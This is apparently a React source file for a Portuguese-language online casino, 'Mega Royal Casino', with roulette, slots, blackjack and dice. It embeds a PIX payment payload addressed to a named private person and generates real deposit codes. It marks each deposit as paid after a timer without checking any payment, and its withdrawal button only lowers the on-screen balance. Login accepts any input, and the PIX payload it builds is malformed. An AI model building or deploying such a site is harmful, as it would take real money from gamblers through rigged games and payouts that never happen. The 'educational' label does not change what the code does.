import React, { useState, useEffect } from "react"; import { Card, CardContent } from "@/components/ui/card"; import { Button } from "@/components/ui/button"; import { Input } from "@/components/ui/input"; import { motion } from "framer-motion";

export default function CasinoFullSite() { const PIX_BASE = "00020126330014BR.GOV.BCB.PIX0111188300586885204000053039865802BR5925DANIEL DE OLIVEIRA CHAVES6014ITAMBE DO MATO62070503***6304";

const [logged, setLogged] = useState(false); const [user, setUser] = useState(""); const [password, setPassword] = useState("");

const [balance, setBalance] = useState(1000); const [bet, setBet] = useState(10); const [result, setResult] = useState("Bem-vindo ao cassino!"); const [game, setGame] = useState("roulette");

const [deposit, setDeposit] = useState(0); const [withdraw, setWithdraw] = useState(0); const [pixCode, setPixCode] = useState(""); const [copied, setCopied] = useState(false); const [pendingDeposit, setPendingDeposit] = useState(null);

function generatePixWithAmount(value) { if (!value || value <= 0) return;

const amount = Number(value).toFixed(2);
const amountField = `54${amount.length.toString().padStart(2, "0")}${amount}`;

const payload = PIX_BASE + amountField;
setPixCode(payload);

// Marca depósito como pendente
setPendingDeposit({
  amount: Number(value),
  createdAt: Date.now(),
  paid: false
});

}

function copyPix() { if (!pixCode) return; navigator.clipboard.writeText(pixCode); setCopied(true); setTimeout(() => setCopied(false), 2000); }

// SIMULA confirmação automática do PIX (educacional) useEffect(() => { if (!pendingDeposit || pendingDeposit.paid) return;

const interval = setInterval(() => {
  const elapsed = Date.now() - pendingDeposit.createdAt;

  // Simula pagamento após ~8 segundos
  if (elapsed > 8000) {
    setBalance((b) => b + pendingDeposit.amount);
    setResult(`✅ PIX confirmado automaticamente: R$ ${pendingDeposit.amount}`);
    setPendingDeposit((p) => ({ ...p, paid: true }));
  }
}, 2000);

return () => clearInterval(interval);

}, [pendingDeposit]);

function login() { if (user && password) setLogged(true); }

function withdrawMoney() { const value = Number(withdraw); if (value > 0 && value <= balance) setBalance((b) => b - value); }

function playRoulette() { const win = Math.random() > 0.6; if (win) { const gain = bet * 2; setBalance((b) => b + gain); setResult(🎉 Roleta: ganhou R$ ${gain}); } else { setBalance((b) => b - bet); setResult(❌ Roleta: perdeu R$ ${bet}); } }

function playSlots() { const win = Math.random() > 0.7; if (win) { const gain = bet * 3; setBalance((b) => b + gain); setResult(🎰 Slots: ganhou R$ ${gain}); } else { setBalance((b) => b - bet); setResult(❌ Slots: perdeu R$ ${bet}); } }

function playBlackjack() { const player = Math.floor(Math.random() * 10) + 12; const dealer = Math.floor(Math.random() * 10) + 12;

if (player > dealer || dealer > 21) {
  const gain = bet * 2;
  setBalance((b) => b + gain);
  setResult(`🃏 Blackjack: ganhou R$ ${gain}`);
} else {
  setBalance((b) => b - bet);
  setResult(`❌ Blackjack: perdeu R$ ${bet}`);
}

}

function playDice() { const player = Math.ceil(Math.random() * 6); const house = Math.ceil(Math.random() * 6);

if (player > house) {
  const gain = bet * 2;
  setBalance((b) => b + gain);
  setResult(`🎲 Dados: ganhou R$ ${gain}`);
} else {
  setBalance((b) => b - bet);
  setResult(`❌ Dados: perdeu R$ ${bet}`);
}

}

function playGame() { if (bet <= 0 || bet > balance) return;

if (game === "roulette") playRoulette();
if (game === "slots") playSlots();
if (game === "blackjack") playBlackjack();
if (game === "dice") playDice();

}

if (!logged) { return ( <div className="min-h-screen flex items-center justify-center bg-black text-white"> <Card className="bg-white/10 backdrop-blur-xl rounded-2xl p-8 w-96"> <CardContent> <h1 className="text-3xl mb-6 text-center font-bold">🎰 Login Casino</h1>

<Input
          placeholder="Usuário"
          value={user}
          onChange={(e) => setUser(e.target.value)}
          className="text-black mb-3"
        />

        <Input
          placeholder="Senha"
          type="password"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          className="text-black mb-4"
        />

        <Button onClick={login} className="w-full rounded-2xl">
          Entrar
        </Button>
      </CardContent>
    </Card>
  </div>
);

}

return ( <div className="min-h-screen bg-gradient-to-br from-black via-purple-900 to-black text-white p-8"> <div className="max-w-6xl mx-auto"> <h1 className="text-5xl font-bold text-center mb-8">🎰 Mega Royal Casino</h1>

<div className="grid md:grid-cols-4 gap-6 mb-8">
      <Card className="bg-white/10 rounded-2xl">
        <CardContent className="p-6">
          <h2 className="text-xl mb-2">Saldo</h2>
          <p className="text-3xl font-bold">R$ {balance}</p>
        </CardContent>
      </Card>

      <Card className="bg-white/10 rounded-2xl">
        <CardContent className="p-6">
          <h2 className="text-lg mb-2">Gerar PIX com Valor</h2>
          <Input
            type="number"
            placeholder="Valor depósito"
            value={deposit}
            onChange={(e) => setDeposit(e.target.value)}
            className="text-black mb-2"
          />
          <Button
            onClick={() => generatePixWithAmount(deposit)}
            className="w-full mb-2"
          >
            Gerar PIX
          </Button>

          {pixCode && (
            <>
              <div className="bg-black/40 p-2 rounded text-xs break-all mb-2">
                {pixCode}
              </div>
              <Button onClick={copyPix} className="w-full">
                {copied ? "Copiado!" : "Copiar PIX"}
              </Button>

              {pendingDeposit && !pendingDeposit.paid && (
                <p className="text-yellow-400 text-xs mt-2">
                  ⏳ Aguardando pagamento automático...
                </p>
              )}

              {pendingDeposit && pendingDeposit.paid && (
                <p className="text-green-400 text-xs mt-2">
                  ✅ Pagamento confirmado automaticamente
                </p>
              )}
            </>
          )}
        </CardContent>
      </Card>

      <Card className="bg-white/10 rounded-2xl">
        <CardContent className="p-6">
          <h2 className="text-lg mb-2">Sacar</h2>
          <Input
            type="number"
            value={withdraw}
            onChange={(e) => setWithdraw(e.target.value)}
            className="text-black mb-2"
          />
          <Button onClick={withdrawMoney} className="w-full">
            Sacar
          </Button>
        </CardContent>
      </Card>
    </div>

    <Card className="bg-white/10 rounded-2xl mb-8">
      <CardContent className="p-6">
        <h2 className="text-2xl mb-4">Escolha o jogo</h2>

        <div className="flex flex-wrap gap-3 mb-4">
          <Button onClick={() => setGame("roulette")}>Roleta</Button>
          <Button onClick={() => setGame("slots")}>Slots</Button>
          <Button onClick={() => setGame("blackjack")}>Blackjack</Button>
          <Button onClick={() => setGame("dice")}>Dados</Button>
        </div>

        <Input
          type="number"
          value={bet}
          onChange={(e) => setBet(Number(e.target.value))}
          className="text-black mb-4"
        />

        <Button onClick={playGame} className="w-full text-lg">
          Jogar
        </Button>
      </CardContent>
    </Card>

    <motion.div
      key={result}
      initial={{ opacity: 0, scale: 0.9 }}
      animate={{ opacity: 1, scale: 1 }}
      className="text-center text-3xl font-semibold"
    >
      {result}
    </motion.div>

    <p className="text-center text-sm mt-10 opacity-60">
      Projeto educacional fictício
    </p>
  </div>
</div>

); }
